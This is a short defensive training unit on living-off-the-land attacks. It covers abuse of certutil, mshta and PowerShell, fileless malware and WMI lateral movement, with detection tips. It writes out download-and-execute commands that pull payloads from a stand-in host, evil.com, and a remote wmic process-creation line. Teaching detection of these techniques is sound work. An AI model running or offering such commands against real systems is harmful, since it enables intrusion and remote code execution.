# Living-off-the-Land Techniques

## 1. Unit Brief: Hiding in Plain Sight
Attackers use tools already installed on the OS (`PowerShell`, `CertUtil`, `BitsAdmin`, `WMI`) to conduct their attacks. This avoids dropping new binaries (Malware) that AV would catch.

## 2. Real-World Relevance
*   **Detection Difficulty**: If you block `powershell.exe`, IT Support can't do their job. If you allow it, Hackers use it. It's a dilemma.

## 3. Core Concepts

### LOLBins (Living Off The Land Binaries)
A list of trusted Microsoft binaries that can be abused.
*   `certutil.exe`: Designed for certificates. Abused to download files.
*   `mshta.exe`: Designed for HTML apps. Abused to execute scripts.
*   `rundll32.exe`: Loads DLLs.

### Fileless Malware
Scripts that run in RAM only.
`powershell -nop -c "IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')"`

## 4. Practical Examples

### The CertUtil Download
Hacker runs:
`certutil.exe -urlcache -split -f http://evil.com/virus.exe C:\Temp\virus.exe`
*   **Defender**: Must look for command line arguments containing `-urlcache` and `http`.

### WMI Lateral Movement
`wmic /node:192.168.1.5 process call create "cmd.exe /c ..."`
*   Uses built-in Windows management features.

## 5. Common Mistakes Beginners Make
*   **Whitelisting by Name**: "Allow `certutil.exe`". This is exactly what the attacker wants. You must monitor *behavior* (What is it downloading?), not just the name.

## 6. Key Takeaways
*   **Context is King**: Why is the Receptionist running `whoami` via `cmd.exe`?
*   **LOLBas Project**: A GitHub repository listing every known LOLBin. Great resource for defenders.
